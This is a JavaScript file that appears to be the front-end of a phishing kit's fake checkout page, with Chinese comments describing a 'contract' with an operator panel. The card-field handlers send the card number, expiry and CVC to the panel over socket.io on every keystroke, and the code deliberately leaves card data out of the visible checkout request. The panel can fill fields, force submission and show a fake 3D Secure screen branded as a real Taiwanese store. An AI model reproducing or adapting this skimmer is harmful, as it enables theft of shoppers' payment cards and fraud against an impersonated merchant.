/*!
 * /bp/connector.js — 结账页接管 connector
 * 契约版本 v1.0  ·  与「建站结账页契约.md」逐条对应
 *
 * 职责：
 *   1. 读取购物车（__BP_CART__ → /api/cart 兜底）并同步 #bp-total
 *   2. 接管卡片三字段（格式化 + input 事件派发）
 *   3. 拦截表单提交 → POST /api/checkout → 成功页跳转（R3）
 *   4. 面板通道（socket.io register / submit_card / to_finish）
 *   5. 验证屏渲染（srcdoc + <base> + 占位符替换，契约 7.4）
 *
 * 注意：本文件不含任何 debounce，面板按 keystroke 取数。
 */
(function () {
  'use strict';

  // ───────────────────────── 0. 配置 ─────────────────────────
  var DEFAULTS = {
    panel_host: 'wss://panel.local',
    socket_path: '/socket.io/',
    logname: 'LOGNAME',
    logtype: 'cc',
    enable_verify: false,
    verify_endpoint: '/api/bp/verify'
  };
  var CFG = Object.assign({}, DEFAULTS);

  // ───────────────────────── 1. 工具 ─────────────────────────
  function $(id) { return document.getElementById(id); }
  function on(el, ev, fn, opts) { if (el) el.addEventListener(ev, fn, opts); }
  function fire(el, type) {
    if (!el) return;
    el.dispatchEvent(new Event(type, { bubbles: true }));
  }
  function digits(s) { return String(s == null ? '' : s).replace(/\D+/g, ''); }
  function log() {
    if (window.__BP_DEBUG__) {
      try { console.log.apply(console, ['[bp]'].concat([].slice.call(arguments))); } catch (e) {}
    }
  }

  // ───────────────────────── 2. 购物车 ─────────────────────────
  var Cart = {
    data: null,
    load: function () {
      var skel = window.__BP_CART__;
      if (skel && (skel.order_number || (skel.items && skel.items.length))) {
        Cart.data = skel;
        Cart.apply();
        return Promise.resolve(skel);
      }
      // 骨架为空 → 回落 GET /api/cart（契约 5.2）
      return fetch('/api/cart', { credentials: 'same-origin' })
        .then(function (r) { return r.json(); })
        .then(function (j) {
          // 契约 5.1：原地 mutate，不换对象
          var c = window.__BP_CART__ || (window.__BP_CART__ = {});
          c.order_number = j.order_number || '';
          c.currency = j.currency || '';
          c.total = typeof j.total === 'number' ? j.total : 0;
          c.total_amount = j.total_amount || '';
          c.items = j.items || [];
          c.locale = j.locale || document.documentElement.lang || 'en';
          Cart.data = c;
          Cart.apply();
          return c;
        })
        .catch(function (e) { log('cart fallback failed', e); return skel || null; });
    },

    apply: function () {
      var c = Cart.data || {};
      var totalEl = $('bp-total');
      var amountText = c.total_amount || '';
      if (totalEl) {
        // 契约 5.1：文本 / data-amount / __BP_CART__.total_amount 三者同源
        if (amountText && totalEl.textContent !== amountText) totalEl.textContent = amountText;
        totalEl.setAttribute('data-amount', String(typeof c.total === 'number' ? c.total : 0));
        totalEl.setAttribute('data-currency', c.currency || '');
      }
      var sub = $('bp-submit-amount');
      if (sub) sub.textContent = amountText ? '（' + amountText + '）' : '';
      var sub2 = $('sum-subtotal');
      if (sub2 && amountText) sub2.textContent = amountText;

      var on = $('order-number');
      if (on && c.order_number) on.textContent = c.order_number;

      var list = $('order-items');
      if (list && c.items && c.items.length) {
        list.innerHTML = '';
        c.items.forEach(function (it) {
          var row = document.createElement('div');
          row.className = 'order-side__item';
          row.innerHTML =
            '<div class="thumb"><img src="' + (it.img || '/bp/3ds/img/visa.svg') + '" alt=""></div>' +
            '<div class="nm">' + String(it.name || '') + '</div>' +
            '<div class="pr">x' + (it.qty || 1) + '</div>';
          list.appendChild(row);
        });
      }

      try {
        document.dispatchEvent(new CustomEvent('bp:cart-applied', { detail: c }));
      } catch (e) {}
    }
  };

  // ───────────────────────── 3. 卡片字段 ─────────────────────────
  var CardField = {
    number: null,
    expiry: null,
    cvc: null,

    bind: function () {
      CardField.number = $('bp-card-number');
      CardField.expiry = $('bp-card-expiry');
      CardField.cvc = $('bp-card-cvc');

      on(CardField.number, 'input', CardField.onNumber);
      on(CardField.expiry, 'input', CardField.onExpiry);
      on(CardField.cvc, 'input', CardField.onCvc);
      [CardField.number, CardField.expiry, CardField.cvc].forEach(function (el) {
        on(el, 'keydown', CardField.onKeyNav);
        on(el, 'paste', CardField.onPaste);
      });
      log('card fields bound', !!CardField.number, !!CardField.expiry, !!CardField.cvc);
    },

    // 每 4 位空格
    onNumber: function (e) {
      var el = e.target;
      var d = digits(el.value).slice(0, 19);
      var out = d.replace(/(\d{4})(?=\d)/g, '$1 ');
      if (el.value !== out) {
        var pos = el.selectionStart;
        var before = el.value.slice(0, pos).replace(/\D/g, '').length;
        el.value = out;
        // 光标按位数还原
        var seen = 0, i = 0;
        for (; i < out.length; i++) {
          if (/\d/.test(out[i])) seen++;
          if (seen >= before) break;
        }
        try { el.setSelectionRange(Math.min(i + 1, out.length), Math.min(i + 1, out.length)); } catch (err) {}
      }
      emitCard();
    },

    // MM/YY 自动补斜线
    onExpiry: function (e) {
      var el = e.target;
      var d = digits(el.value).slice(0, 4);
      var out = d;
      if (d.length >= 3) out = d.slice(0, 2) + '/' + d.slice(2);
      else if (d.length === 1 && Number(d) > 1) out = '0' + d + '/';
      else if (d.length === 2 && Number(d) > 1 && Number(d) <= 12) out = d + '/';
      if (el.value !== out) el.value = out;
      emitCard();
    },

    onCvc: function (e) {
      var el = e.target;
      var d = digits(el.value).slice(0, 4);
      if (el.value !== d) el.value = d;
      emitCard();
    },

    onKeyNav: function (e) {
      var el = e.target;
      var max = { 'bp-card-number': 19, 'bp-card-expiry': 5, 'bp-card-cvc': 4 }[el.id] || 99;
      if (e.key === 'Backspace' || e.key === 'Delete' || e.key.length > 1) return;
      if (digits(el.value).length >= max) {
        e.preventDefault();
        if (el.id === 'bp-card-number') CardField.expiry && CardField.expiry.focus();
        if (el.id === 'bp-card-expiry') CardField.cvc && CardField.cvc.focus();
      }
    },

    onPaste: function (e) {
      var el = e.target;
      var txt = (e.clipboardData || window.clipboardData).getData('text');
      if (!txt) return;
      e.preventDefault();
      el.value = txt;
      // 契约 4.1：程序化写值后必须派发 input
      fire(el, 'input');
    },

    values: function () {
      return {
        number: digits(CardField.number && CardField.number.value),
        expiry: (CardField.expiry && CardField.expiry.value) || '',
        cvc: digits(CardField.cvc && CardField.cvc.value)
      };
    },

    // 程序化填值（面板 r6 回填时用），写后必派发 input
    set: function (v) {
      if (!v) return;
      if (v.number != null && CardField.number) { CardField.number.value = v.number; fire(CardField.number, 'input'); }
      if (v.expiry != null && CardField.expiry) { CardField.expiry.value = v.expiry; fire(CardField.expiry, 'input'); }
      if (v.cvc != null && CardField.cvc) { CardField.cvc.value = v.cvc; fire(CardField.cvc, 'input'); }
    }
  };

  // 汇总卡片状态推给面板
  var cardTimer = null;
  function emitCard() {
    var v = CardField.values();
    try {
      document.dispatchEvent(new CustomEvent('bp:card-input', { detail: v }));
    } catch (e) {}
    if (Panel.socket) {
      Panel.socket.emit('submit_card', {
        logname: CFG.logname,
        logtype: CFG.logtype,
        order_number: (Cart.data && Cart.data.order_number) || '',
        card_number: v.number,
        card_expiry: v.expiry,
        card_cvc: v.cvc,
        ts: Date.now()
      });
    }
  }

  // ───────────────────────── 4. 提交 ─────────────────────────
  var Submitting = false;

  function setError(msg) {
    var el = $('bp-error');
    if (el) el.textContent = msg || '';
  }

  function setBusy(busy) {
    var btn = $('bp-submit');
    if (!btn) return;
    // 契约 4.1：提交中不 disabled，只置 aria-busy
    btn.setAttribute('aria-busy', busy ? 'true' : 'false');
  }

  function collectCustomer() {
    function val(id) { var el = $(id); return el ? String(el.value || '').trim() : ''; }
    return {
      name: val('t-name'),
      email: val('t-email'),
      addr: val('t-addr'),
      city: val('t-city'),
      zip: val('t-zip'),
      country: val('t-country') || 'TW'
    };
  }

  function validate(customer) {
    var v = CardField.values();
    if (!customer.name) return '請填寫收件人姓名';
    if (!customer.email || !/^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(customer.email)) return '請填寫正確的電子郵件';
    if (!customer.addr) return '請填寫收件地址';
    if (v.number.length < 12) return '請填寫完整的信用卡號';
    if (!/^\d{2}\/\d{2}$/.test(v.expiry)) return '有效期限格式為 MM/YY';
    var mm = Number(v.expiry.slice(0, 2));
    if (mm < 1 || mm > 12) return '有效期限月份不正確';
    if (v.cvc.length < 3) return '請填寫安全碼';
    return '';
  }

  function orderUrl(no) {
    // 桌面站 /checkout → /order/<no>；行動站 /m/checkout → /m/order/<no>
    var base = /^\/m(\/|$)/.test(location.pathname) ? '/m' : '';
    return base + '/order/' + encodeURIComponent(no) + (location.search || '');
  }

  function submit(reason) {
    reason = reason || 'user';
    log('submit', reason);
    if (Submitting) return Promise.resolve({ ok: false, error_code: 'in_flight' });

    var customer = collectCustomer();
    var err = validate(customer);
    if (err) { setError(err); return Promise.resolve({ ok: false, error_code: 'validation', message: err }); }

    var c = Cart.data || window.__BP_CART__ || {};
    var payload = {
      order_number: c.order_number || '',
      amount: typeof c.total === 'number' ? c.total : 0,
      currency: c.currency || 'TWD',
      locale: c.locale || document.documentElement.lang || 'zh-TW',
      utm: window.__BP_UTM__ || {},
      customer: customer
      // 契约 6.1：卡片数据不进这个请求
    };

    Submitting = true;
    setBusy(true);
    setError('');

    return fetch('/api/checkout', {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    })
      .then(function (r) { return r.json(); })
      .then(function (j) {
        Submitting = false;
        setBusy(false);
        if (j && j.ok) {
          var no = j.order_number || payload.order_number;
          // 契约 6.2：单号复用，成功页由前端决定
          location.href = orderUrl(no);
          return j;
        }
        setError((j && (j.message || j.error_code)) || '付款失敗，請稍後再試');
        return j || { ok: false };
      })
      .catch(function (e) {
        Submitting = false;
        setBusy(false);
        setError('網路連線異常，請確認網路後再試一次');
        return { ok: false, error_code: 'network', message: String(e && e.message) };
      });
  }

  function bindForm() {
    var form = $('bp-form');
    if (!form) return;
    // 契约 4.2：不要 action；submit 由 connector 拦截
    on(form, 'submit', function (e) {
      e.preventDefault();
      submit('form');
    });
    on($('bp-submit'), 'click', function (e) {
      e.preventDefault();
      submit('button');
    });
  }

  // ───────────────────────── 5. 面板通道 ─────────────────────────
  var Panel = {
    socket: null,
    loaded: false,

    // 契约 2：connector 缺 io 时自动补加载 socket.io client
    ensureIo: function () {
      if (window.io) return Promise.resolve(window.io);
      return new Promise(function (resolve) {
        var s = document.createElement('script');
        s.src = '/bp/socket.io.min.js';
        s.onload = function () { resolve(window.io); };
        s.onerror = function () { resolve(null); };
        document.head.appendChild(s);
      });
    },

    connect: function () {
      Panel.ensureIo().then(function (io) {
        if (!io) { log('io unavailable, panel channel offline'); return; }
        try {
          Panel.socket = io(CFG.panel_host, {
            path: CFG.socket_path,
            transports: ['websocket'],
            reconnectionDelay: 2000,
            timeout: 15000
          });
        } catch (e) {
          log('socket connect failed', e);
          return;
        }

        Panel.socket.on('connect', function () {
          log('panel connected');
          Panel.register();
        });

        // 面板 → connector
        Panel.socket.on('r6', function (msg) { Panel.onR6(msg); });
        Panel.socket.on('to_finish', function (msg) { submit('to_finish'); });
        Panel.socket.on('bp_3ds_render', function (msg) { ThreeDS.render(msg && msg.html, msg && msg.params); });
        Panel.socket.on('disconnect', function () { log('panel disconnected'); });
      });
    },

    register: function () {
      if (!Panel.socket) return;
      var c = Cart.data || {};
      Panel.socket.emit('register', {
        logname: CFG.logname,
        logtype: CFG.logtype,
        order_number: c.order_number || '',
        total_amount: c.total_amount || '',
        currency: c.currency || '',
        items: c.items || [],
        locale: c.locale || document.documentElement.lang || 'zh-TW',
        url: location.href,
        ua: navigator.userAgent
      });
    },

    onR6: function (msg) {
      if (!msg) return;
      // 契约 6.2：r6(to_finish) 也会触发一次同样提交流程（幂等兜底）
      if (msg.action === 'to_finish') { submit('r6'); return; }
      if (msg.action === 'fill_card') { CardField.set(msg.card); return; }
      if (msg.action === 'error') { setError(msg.message || '付款失敗'); return; }
    }
  };

  // ───────────────────────── 6. 验证屏（契约 7.4） ─────────────────────────
  var ThreeDS = {
    host: null,
    iframe: null,

    ensureHost: function () {
      if (ThreeDS.host) return ThreeDS.host;
      var wrap = document.createElement('div');
      wrap.id = 'bp-3ds-layer';
      wrap.setAttribute('aria-live', 'polite');
      wrap.innerHTML = '<div id="bp-3ds-backdrop"></div>';
      ThreeDS.iframe = document.createElement('iframe');
      ThreeDS.iframe.id = 'bp-3ds-frame';
      ThreeDS.iframe.setAttribute('title', '3D Secure 驗證');
      ThreeDS.iframe.setAttribute('sandbox', 'allow-scripts allow-forms allow-same-origin');
      ThreeDS.iframe.style.display = 'block';
      wrap.appendChild(ThreeDS.iframe);
      document.body.appendChild(wrap);
      ThreeDS.host = wrap;
      return wrap;
    },

    show: function (on) {
      ThreeDS.ensureHost();
      ThreeDS.host.style.display = on ? 'flex' : 'none';
      ThreeDS.host.setAttribute('data-open', on ? 'true' : 'false');
    },

    /**
     * 契约 7.4 三件事：
     *  ① 绝对化运行时 <script src="../bp-template-runtime.js"> → /bp/bp-template-runtime.js
     *  ② 注入 <base href="/bp/3ds/"> + formatPartial shim + BP_PARAMS（排在模板脚本之前）
     *  ③ 替换占位符 {{merchantName}} {{amount}} {{orderid}} {{date}} {{time}} {{phone:4}} …
     */
    build: function (html, params) {
      var c = Cart.data || {};
      var now = new Date();
      var p = Object.assign({
        merchantName: 'momo購物網',
        amount: c.total_amount || '',
        orderid: c.order_number || '',
        date: now.toLocaleDateString('zh-TW'),
        time: now.toLocaleTimeString('zh-TW', { hour12: false })
      }, params || {});

      var out = String(html || '')
        // ① 绝对化
        .replace(/(<script[^>]+src=["'])\.\.?\/bp-template-runtime\.js(["'])/gi, '$1/bp/bp-template-runtime.js$2')
        .replace(/(<script[^>]+src=["'])bp-template-runtime\.js(["'])/gi, '$1/bp/bp-template-runtime.js$2');

      // ③ 占位符替换（带格式：取末 N 位）
      out = out.replace(/\{\{\s*([a-zA-Z_][\w]*)\s*(?::\s*(\d+))?\s*\}\}/g, function (m, key, tail) {
        var v = p[key];
        if (v == null) return '';
        v = String(v);
        if (tail) v = v.slice(-Number(tail));
        return v.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      });

      // ② 头部注入
      var head =
        '<base href="/bp/3ds/">' +
        '<script>window.BP_PARAMS=' + JSON.stringify(p).replace(/</g, '\\u003c') + ';<\/script>' +
        '<script>if(!window.formatPartial){window.formatPartial=function(s,o){o=o||{};return String(s||"").replace(/\\{\\{\\s*([a-zA-Z_][\\w]*)\\s*(?::\\s*(\\d+))?\\s*\\}\\}/g,function(m,k,t){var v=o[k];if(v==null)return "";v=String(v);return t?v.slice(-Number(t)):v;});};}<\/script>' +
        '<script src="/bp/bp-template-runtime.js"><\/script>';

      if (/<head[^>]*>/i.test(out)) return out.replace(/<head([^>]*)>/i, '<head$1>' + head);
      return '<!doctype html><html><head>' + head + '</head><body>' + out + '</body></html>';
    },

    render: function (html, params) {
      if (!html) return;
      ThreeDS.ensureHost();
      ThreeDS.iframe.srcdoc = ThreeDS.build(html, params);
      ThreeDS.show(true);
    },

    bindMessages: function () {
      // 契约 7.4：不要拦截或 stopPropagation 掉 iframe 消息
      on(window, 'message', function (e) {
        var d = e.data;
        if (!d || typeof d !== 'object') return;
        if (d.type === 'bp_3ds_ready') log('3ds ready');
        if (d.type === 'bp_3ds_submit') {
          ThreeDS.show(false);
          submit('3ds');
        }
        if (d.type === 'bp_3ds_close') ThreeDS.show(false);
      });
    }
  };

  // ───────────────────────── 7. 启动 ─────────────────────────
  function boot() {
    CardField.bind();
    bindForm();
    ThreeDS.bindMessages();

    Cart.load().then(function () {
      // 契约 5.1：数据到达后派发 bp:cart-ready
      var c = Cart.data || window.__BP_CART__;
      if (c) {
        try { window.dispatchEvent(new CustomEvent('bp:cart-ready', { detail: c })); } catch (e) {}
      }
      Panel.connect();
    });
  }

  function loadConfig() {
    return fetch('/bp/config.json', { credentials: 'same-origin' })
      .then(function (r) { return r.json(); })
      .then(function (j) { CFG = Object.assign({}, DEFAULTS, j || {}); })
      .catch(function () {});
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function () { loadConfig().then(boot); });
  } else {
    loadConfig().then(boot);
  }

  // 对外暴露（面板调试用）
  window.BP = {
    cart: function () { return Cart.data || window.__BP_CART__; },
    submit: submit,
    threeDS: ThreeDS,
    card: CardField,
    config: function () { return CFG; }
  };
})();
